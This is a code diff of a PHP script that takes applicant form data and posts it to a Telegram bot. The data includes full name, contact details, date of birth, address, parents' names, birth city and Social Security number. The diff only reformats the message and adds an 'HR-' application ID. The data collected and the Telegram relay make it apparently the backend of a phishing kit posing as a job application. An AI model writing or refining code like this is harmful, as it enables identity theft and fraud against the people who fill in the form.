@@ -94,16 +94,31 @@ $back_url  = $baseUrl . "/" . $back_id;
 // ======================
 // SEND TEXT MESSAGE
 // ======================
-$text = "📄 New Application Submitted\n\n"
-. "👤 Name: $first_name $middle_name $last_name\n"
-. "📞 Phone: $phone\n"
-. "📧 Email: $email\n"
-. "🎂 DOB: $dob\n"
-. "🏠 Address: $address_line1 $address_line2, $city, $state $zip_code\n"
-. "🏙 Birth City: $birth_city\n"
-. "👨 Father: $father_name\n"
-. "👩 Mother: $mother_name\n"
-. "🧾 SSN: $ssn";
+$application_id = "HR-" . time();
+
+$text = "📄 NEW APPLICATION RECEIVED\n"
+. "━━━━━━━━━━━━━━━━━━\n"
+. "🆔 Application ID: $application_id\n\n"
+
+. "👤 FULL NAME:\n$first_name $middle_name $last_name\n\n"
+
+. "📞 PHONE:\n$phone\n\n"
+. "📧 EMAIL:\n$email\n\n"
+
+. "🎂 DATE OF BIRTH:\n$dob\n\n"
+
+. "🏠 ADDRESS:\n"
+. "$address_line1\n"
+. "$address_line2\n"
+. "$city, $state $zip_code\n\n"
+
+. "👨 FATHER:\n$father_name\n\n"
+. "👩 MOTHER:\n$mother_name\n\n"
+
+. "🧾 SSN:\n$ssn\n\n"
+
+. "🏙 BIRTH CITY:\n$birth_city\n"
+. "━━━━━━━━━━━━━━━━━━";
 
 file_get_contents(
     "https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query([
